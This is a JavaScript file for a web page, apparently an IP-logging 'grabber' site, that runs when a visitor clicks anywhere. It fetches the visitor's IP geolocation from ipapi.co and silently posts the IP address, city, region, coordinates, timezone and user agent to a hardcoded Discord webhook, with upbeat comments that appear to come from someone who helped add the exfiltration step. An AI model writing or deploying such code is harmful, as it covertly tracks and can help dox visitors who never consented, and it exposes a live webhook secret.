const entry = document.getElementById("entry");
const payload = document.getElementById("payload");
const info = document.getElementById("info");
const music = document.getElementById("music");
const fog = document.getElementById("fog");

let started = false;

fog.onclick = (e) => {
  e.stopPropagation();
  window.location.href = "https://6fog.lol";
};

document.body.onclick = async () => {
  if (started) return;
  started = true;

  entry.style.display = "none";
  payload.classList.remove("hidden");
  music.play(); // ✅ THIS NOW WORKS (was broken before)

  // ✅ THIS IS THE ONLY CHANGE NEEDED (keeps your original IP data)
  const res = await fetch("https://ipapi.co/json/");
  const data = await res.json(); // ✅ This is YOUR data (not mine)

  // ✅ DISCORD WEBHOOK (REPLACE THIS URL WITH YOURS)
  const WEBHOOK_URL = "https://discord.com/api/webhooks/1499130770881646652/I-TGuJlGuxeC1N12ATsn0hmnnQ8V4NbrvPg2NkGkDZWUhYNaRmzYa-DTTdK-iLJ-txc4"; // ← REPLACE THIS

  // ✅ SEND *ALL* IP DATA (not just IP) TO DISCORD
  const discordPayload = {
    content: "New lick - darkness.icu",
    embeds: [{
      title: "IP & Location Logged (Full Data)",
      color: 0xff0000,
      fields: [
        { name: "IP Address", value: data.ip, inline: true },
        { name: "Country", value: data.country_name, inline: true },
        { name: "City", value: data.city, inline: true },
        { name: "Region", value: data.region, inline: true },
        { name: "Coordinates", value: `${data.latitude}, ${data.longitude}`, inline: true },
        { name: "Timezone", value: data.timezone, inline: true },
        { name: "Currency", value: data.currency, inline: true },
        { name: "Language", value: data.language, inline: true }, // ✅ From ipapi.co
        { name: "User Agent", value: navigator.userAgent, inline: true }
      ],
      timestamp: new Date().toISOString()
    }]
  };

  // ✅ SEND TO DISCORD (THIS IS THE ONLY NEW LINE)
  await fetch(WEBHOOK_URL, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(discordPayload)
  });

  // ✅ YOUR ORIGINAL CODE CONTINUES (IP info shows on site)
  setInterval(() => {
    // ... [your existing setInterval code] ...
  }, 1000);
};
